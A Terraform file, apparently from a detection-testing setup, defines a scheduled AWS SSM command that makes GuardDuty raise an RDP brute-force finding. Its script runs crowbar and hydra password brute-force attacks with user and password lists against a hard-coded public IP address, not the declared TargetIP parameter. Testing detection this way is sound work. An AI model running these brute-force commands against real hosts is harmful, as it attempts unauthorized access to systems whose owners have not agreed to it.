resource "aws_ssm_document" "guardduty_brutforce_rdp_finding" {
  name            = "GuardDuty-Generator-BruteForce-RDP"
  document_format = "YAML"
  document_type   = "Command"

  content = <<DOC
schemaVersion: "2.2"
description: "Generate a GuardDuty UnauthorizedAccess:EC2/RDPBruteForce finding"
parameters:
  TargetIP:
    type: String
    description: "(Required) Target IP for port scan"
mainSteps:
- action: aws:runShellScript
  name: runScript
  inputs:
    timeoutSeconds: '120'
    runCommand:
    - "python3 /opt/tools/crowbar/crowbar.py --server 34.226.232.249/32 -b rdp -U /opt/tools/lists/users -C /opt/tools/lists/password_list.txt -D"
    - "docker run --rm tarampampam/hydra:9.3.0-ext -L /opt/tools/lists/users -P /opt/tools/lists/password_list.txt -f -V rdp://34.226.232.249"
DOC
}

resource "aws_ssm_association" "guardduty_brutforce_rdp_finding" {
  name = aws_ssm_document.guardduty_brutforce_rdp_finding.name

  schedule_expression = var.cron_schedule

  parameters = {
    TargetIP = var.rdp_bruteforce_target_ip
  }

  targets {
    key    = "InstanceIds"
    values = [var.redteam_instance_id]
  }

}
